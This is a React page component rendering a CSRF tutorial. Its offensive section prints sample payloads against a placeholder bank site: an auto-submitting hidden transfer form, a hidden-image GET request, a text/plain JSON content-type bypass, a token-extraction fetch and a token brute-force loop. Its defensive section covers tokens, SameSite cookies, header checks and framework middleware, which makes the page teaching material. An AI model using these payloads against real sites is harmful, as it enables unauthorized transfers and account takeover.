// File: /app/csrf/page.tsx
export default function CSRFPage() {
  return (
    <main className="p-8 max-w-4xl mx-auto font-sans text-white">
      <h1 className="text-4xl font-extrabold mb-8 text-purple-600">
        CSRF (Cross-Site Request Forgery) Comprehensive Guide
      </h1>

      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-3">What is CSRF?</h2>
        <p className="leading-relaxed">
          Cross-Site Request Forgery (CSRF) is an attack that tricks authenticated users into submitting unwanted requests to a web application where they are currently logged in.
        </p>
        <div className="mt-4 p-4 bg-gray-800 rounded-lg">
          <h3 className="text-lg font-semibold mb-2 text-orange-300">CSRF Impact Severity:</h3>
          <ul className="list-disc list-inside space-y-1">
            <li>Unauthorized account changes</li>
            <li>Financial transactions (transfers, purchases)</li>
            <li>Data modification or deletion</li>
            <li>Account takeover</li>
            <li>Privilege escalation</li>
          </ul>
        </div>
      </section>

      <section className="mb-10">
        <h2 className="text-3xl font-semibold mb-4 text-red-600">Red Team Techniques (Offensive)</h2>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">1. Basic CSRF Attacks</h3>
          
          <h4 className="font-medium mb-1 mt-3">Form-Based CSRF</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
</form>
<script>document.forms[0].submit()</script>`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">GET-Based CSRF</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`<img src="https://bank.com/transfer?amount=1000&to=attacker" width="0" height="0">`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">2. Advanced CSRF Techniques</h3>
          
          <h4 className="font-medium mb-1 mt-3">JSON CSRF with Flash</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`# Flash app that sends JSON POST with credentials
# Bypasses some CSRF protections`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Content-Type Bypass</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`# Change Content-Type to bypass validation
<form enctype="text/plain" method="POST">
  <input name='{"amount":1000,"to":"attacker","ignore":"' value='"}'>
</form>`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">3. CSRF Token Exploitation</h3>
          
          <h4 className="font-medium mb-1 mt-3">Token Leakage</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`# Extract token from other pages
fetch('/settings').then(r => r.text())
  .then(html => extractToken(html))`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Token Prediction</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`# If tokens are predictable
for i in range(1000,2000):
  try_token(base_token + str(i))`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">4. Real-World Attack Scenarios</h3>
          
          <h4 className="font-medium mb-1 mt-3">Bank Transfer</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`1. Victim logs into bank.com
2. Visits attacker site with hidden form
3. Form submits transfer to attacker`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Password Reset</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`1. Victim clicks link in phishing email
2. Hidden request changes email/password
3. Attacker gains account access`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">5. Tools & Automation</h3>
          
          <h4 className="font-medium mb-1 mt-3">Discovery Tools</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Burp Suite Scanner</li>
            <li>OWASP ZAP</li>
            <li>CSRF Tester</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Exploitation Tools</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Burp Suite CSRF PoC Generator</li>
            <li>XSS Hunter (for token theft)</li>
            <li>Custom JavaScript payloads</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Analysis Tools</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Browser developer tools</li>
            <li>Token analysis scripts</li>
            <li>Request analyzers</li>
          </ul>
        </article>
      </section>

      <section className="mb-10">
        <h2 className="text-3xl font-semibold mb-4 text-blue-600">Blue Team Defenses (Defensive)</h2>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">1. Anti-CSRF Tokens</h3>
          
          <h4 className="font-medium mb-1 mt-3">Synchronizer Token Pattern</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`// Node.js example
const csrf = require('csurf');
app.use(csrf());
app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Double Submit Cookie</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`// Set cookie and form field with same random value
Set-Cookie: CSRF-TOKEN=abc123;
<input type="hidden" name="csrf_token" value="abc123">`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">2. Cookie Protections</h3>
          
          <h4 className="font-medium mb-1 mt-3">SameSite Attribute</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`Set-Cookie: session=abc123; SameSite=Lax; Secure`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Cookie Prefixes</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`Set-Cookie: __Secure-session=abc123; Secure; HttpOnly`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">3. Additional Protections</h3>
          
          <h4 className="font-medium mb-1 mt-3">Custom Headers</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`// Require custom header for API requests
if (request.headers['X-Requested-With'] !== 'XMLHttpRequest') {
  return response.status(403).send('Forbidden');
}`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Referer Validation</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`// Check request origin
if (!request.headers.referer.startsWith('https://yourdomain.com')) {
  return response.status(403).send('Forbidden');
}`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">4. Framework Protections</h3>
          
          <h4 className="font-medium mb-1 mt-3">Django CSRF Middleware</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`# settings.py
MIDDLEWARE = [
    'django.middleware.csrf.CsrfViewMiddleware',
    ...
]

# Template
<form method="post">{% csrf_token %}</form>`}
          </pre>

          <h4 className="font-medium mb-1 mt-3">Spring Security</h4>
          <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`@Configuration
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());
    }
}`}
          </pre>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">5. Monitoring & Response</h3>
          
          <h4 className="font-medium mb-1 mt-3">Detection</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Missing CSRF tokens</li>
            <li>Invalid token submissions</li>
            <li>Referer header anomalies</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Logging</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Failed CSRF validations</li>
            <li>Sensitive action attempts</li>
            <li>Origin header mismatches</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Response</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Session invalidation</li>
            <li>User notification</li>
            <li>Forensic analysis</li>
          </ul>
        </article>
      </section>

      <section className="mb-12">
        <h2 className="text-3xl font-semibold mb-4">Additional Resources & References</h2>
        <div className="space-y-6">
          <div className="bg-gray-800 p-4 rounded-lg">
            <h3 className="text-xl font-semibold mb-3 text-yellow-400">Learning Resources</h3>
            <ul className="space-y-3">
              <li>
                <a href="https://owasp.org/www-community/attacks/csrf" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  OWASP CSRF — Comprehensive documentation
                </a>
              </li>
              <li>
                <a href="https://portswigger.net/web-security/csrf" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  PortSwigger Academy — CSRF labs
                </a>
              </li>
              <li>
                <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  PayloadsAllTheThings — CSRF cheatsheet
                </a>
              </li>
            </ul>
          </div>
          <div className="bg-gray-800 p-4 rounded-lg">
            <h3 className="text-xl font-semibold mb-3 text-yellow-400">Security Tools</h3>
            <ul className="space-y-3">
              <li>
                <a href="https://portswigger.net/burp" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  Burp Suite — CSRF PoC generator
                </a>
              </li>
              <li>
                <a href="https://www.zaproxy.org/" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  OWASP ZAP — CSRF scanner
                </a>
              </li>
              <li>
                <a href="https://github.com/0xInfection/XSRFProbe" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  XSRFProbe — Advanced CSRF testing
                </a>
              </li>
            </ul>
          </div>
        </div>
      </section>

      <div className="p-4 bg-gray-800 rounded-lg border-l-4 border-purple-500">
        <h3 className="text-lg font-semibold mb-2 text-purple-400">CSRF Mitigation Checklist</h3>
        <ul className="list-disc list-inside ml-4 space-y-1">
          <li>Implement anti-CSRF tokens for state-changing requests</li>
          <li>Set SameSite cookie attribute (Strict or Lax)</li>
          <li>Validate Referer headers for sensitive actions</li>
          <li>Require re-authentication for critical operations</li>
          <li>Use framework-provided CSRF protections</li>
          <li>Monitor for failed CSRF validations</li>
          <li>Educate developers about CSRF risks</li>
          <li>Regularly test your defenses</li>
        </ul>
      </div>
    </main>
  );
}